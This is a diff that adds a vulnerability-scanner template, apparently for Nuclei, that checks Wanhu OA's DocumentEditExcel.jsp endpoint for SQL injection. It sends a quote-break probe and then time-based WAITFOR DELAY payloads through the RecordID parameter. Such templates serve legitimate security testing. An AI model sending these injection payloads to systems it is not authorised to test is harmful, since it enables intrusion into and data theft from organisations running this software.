@@ -1,0 +1,49 @@
+id: poc-yaml-whir-oa-documenteditexcel-sqli
+info:
+  name: 万户OA DocumentEditExcel SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 万户OA
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp?RecordID=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "java.lang.NullPointerException"
+
+  - raw:
+      - |
+        GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp?RecordID=1'%3b+WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /defaultroot/public/iWebOfficeSign/DocumentEditExcel.jsp?RecordID=1'%3b+WAITFOR%20DELAY%20%270:0:8%27-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: header
+        words:
+          - "iWebOfficeSign"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
